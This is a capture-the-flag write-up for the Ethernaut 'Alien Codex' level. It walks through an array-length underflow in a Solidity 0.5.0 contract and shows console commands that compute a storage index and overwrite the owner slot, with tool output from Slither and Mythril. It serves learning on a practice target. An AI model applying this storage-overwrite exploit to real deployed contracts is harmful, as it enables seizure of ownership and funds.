# Alien Codex

[Alien Codex](https://ethernaut.openzeppelin.com/level/0xd8d8184a9F930F8B0F7AD48F14c7437c12fADF96)

1. `AlienCodex` has an underflow vulnerability on setting the length of a `byte32[]` array state variable.
1. This allows us to write to any storage location within this contract.
1. Once the array length is corrupted, we can overwrite the contract owner address.

<BR />

## Using Foundry with Solidity v0.5.0

_Trying to solve this from Foundry, problems arise because of the support for Solidity v0.5.0_

For example compiling the `AlienTest.t.sol` test  whilst including the import: <BR />
`import "forge-std/Test.sol";`

...fails since `abstract` is supported as from Solidity v0.6.0. <BR />
```
Compiler run failed:
Error: Expected pragma, import directive or contract/interface/library definition.
abstract contract CommonBase {
```

Also running `chisel` fails with: <BR />
```
$ chisel
Error: solc 0.5.0 is not supported by the set evm version: paris. Please install and use a version of solc higher or equal to 0.8.18.
You can also set the solc version in your foundry.toml.

Location:
    chisel\src\session_source.rs:112:21
```


<BR />


## Create Foundry Project

```BASH
mkdir 16_AlienCodex
cd 16_AlienCodex
forge init --no-commit
```

Install OpenZeppelin dependencies for Solidity v0.5.0:
```BASH
forge install OpenZeppelin/openzeppelin-contracts@v2.5.0 --no-commit
```

<BR />



## Attack Setup

1. [./test/AlienTest.t.sol](./test/AlienTest.t.sol) shows how we can mess the array length.


1. From Chrome Console

    ```JS
    // Check the the contact flag is initally set
    await contract.contact()
    // false

    // Set the contact flag to true
    await contract.makeContact()
    await contract.contact()
    // true

    // See the current onwer address
    await contract.owner()
    // '0xd8d8184a9F930F8B0F7AD48F14c7437c12fADF96'

    // Break the array length to get access to all contract storage
    await contract.retract()

    // Storage 0: 0x000000000000000000000001d8d8184a9f930f8b0f7ad48f14c7437c12fadf96
    //              \----------------------/\--------------------------------------/
    //                  Contact Flag                         owner
    //
    // Storage 1: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

    ```

1. We can find the array storage for index zero as follows:
    ```JS
    // 1 is the storage slot for the array length
    web3.utils.keccak256(web3.utils.encodePacked(1))
    //0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    ```

1. We can confirm this by running tests and checking the state changes from etherscan.


<BR />


### Test 1
1. Setting the length to -1 (0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) 
    ```JS
    await contract.retract()
    ```

1. And pushing 
    ```JS
    await contract.record("0x1234")
    ```

1. We wrote to, [see etherscan.io](https://goerli.etherscan.io/tx/0x40db55613ff17647525fbf9120a6dc736bcf50b229a655f4f67672a0e02b8ae4#statechange): <BR />
    `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf5`

1. Confirm using:
    ```JS
    await web3.eth.getStorageAt("0x0d005986276C56Cf8da70222CD23dd241D623F97", "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf5")
    ```

1. Ultimately the length went back to 0 since push increments the array length.

<BR />

### Test 2

1. Setting the length to -2 (0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFe) 
    ```JS
    await contract.retract()
    await contract.retract()
    ```

1. And writing to index 0
    ```JS
    await contract.revise(0, "0xabc123")
    ```

1. We wrote to, [see etherscan.io](https://goerli.etherscan.io/tx/0xd5a3878e4973b0ab8f18101445958ec4852c3ceda6e72bbafc8d54b178eb1f25#statechange): <BR />
    `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`


1. Confirm using:
    ```JS
    await web3.eth.getStorageAt("0x0d005986276C56Cf8da70222CD23dd241D623F97", "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6")
    ```


<BR />


### Attack

1. Computing array index that maps to storage location 0:

    ```JS
    limit       = web3.utils.toBN("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF")
    zeroLessOne = web3.utils.toBN("0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf5")
    zero        = web3.utils.toBN("0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6")


    over = limit.sub(zeroLessOne)
    over.toString(16)
    //4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

    over.add(zero).toString(16)
    //10000000000000000000000000000000000000000000000000000000000000000
    ```

1. Get current value at storage 0
    ```JS
    await web3.eth.getStorageAt("0x0d005986276C56Cf8da70222CD23dd241D623F97" , 0)
    //Current: '0x000000000000000000000001d8d8184a9f930f8b0f7ad48f14c7437c12fadf96'
    //New:     "0x000000000000000000000001CbB9660eA60B895443ef5001B968b6Ae4c0AaA18"
    ```

1. And writing to storage 0
    ```JS
    await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x000000000000000000000001CbB9660eA60B895443ef5001B968b6Ae4c0AaA18")
    ```

1. Confirm new contract owner:
    ```JS
    await contract.owner()
    await contract.contact()
    ```


<BR />

## Vulnerability Testing Tools


<BR />

### Slither

Bug not detected.

```BASH
solc-select use 0.5.0
slither ./src/AlienCodex.sol  --exclude-optimization
```

```
Context._msgData() (lib/openzeppelin-contracts/contracts/GSN/Context.sol#23-26) is never used and should be removed
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#dead-code

Pragma version^0.5.0 (src/AlienCodex.sol#2) allows old versions
Pragma version^0.5.0 (lib/openzeppelin-contracts/contracts/GSN/Context.sol#1) allows old versions
Pragma version^0.5.0 (lib/openzeppelin-contracts/contracts/ownership/Ownable.sol#1) allows old versions
solc-0.5.0 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter AlienCodex.record(bytes32)._content (src/AlienCodex.sol#20) is not in mixedCase
Parameter AlienCodex.revise(uint256,bytes32)._content (src/AlienCodex.sol#28) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions

Redundant expression "this (lib/openzeppelin-contracts/contracts/GSN/Context.sol#24)" inContext (lib/openzeppelin-contracts/contracts/GSN/Context.sol#13-27)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#redundant-statements
./src/AlienCodex.sol analyzed (3 contracts with 76 detectors), 8 result(s) found
```

<BR />

### Mythril

Doesn't work maybe its the solidity version `0.5.x` (Mythril version v0.23.24).

```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/16_AlienCodex:/share `
        mythril/myth `
        analyze /share/src/AlienCodex.sol `
        --solc-json /share/mythril_map.json `
        --solv 0.5.0
```

```
mythril.interfaces.cli [ERROR]: Traceback (most recent call last):
  File "/usr/local/lib/python3.10/site-packages/mythril/interfaces/cli.py", line 967, in parse_args_and_execute
    execute_command(
  File "/usr/local/lib/python3.10/site-packages/mythril/interfaces/cli.py", line 868, in execute_command
    "json": report.as_json(),
  File "/usr/local/lib/python3.10/site-packages/mythril/analysis/report.py", line 304, in as_json
    return json.dumps(result, sort_keys=True)
  File "/usr/local/lib/python3.10/json/__init__.py", line 238, in dumps
    **kw).encode(obj)
  File "/usr/local/lib/python3.10/json/encoder.py", line 199, in encode
    chunks = self.iterencode(o, _one_shot=True)
  File "/usr/local/lib/python3.10/json/encoder.py", line 257, in iterencode
    return _iterencode(o, 0)
  File "/usr/local/lib/python3.10/json/encoder.py", line 179, in default
    raise TypeError(f'Object of type {o.__class__.__name__} '
TypeError: Object of type bytes is not JSON serializable
```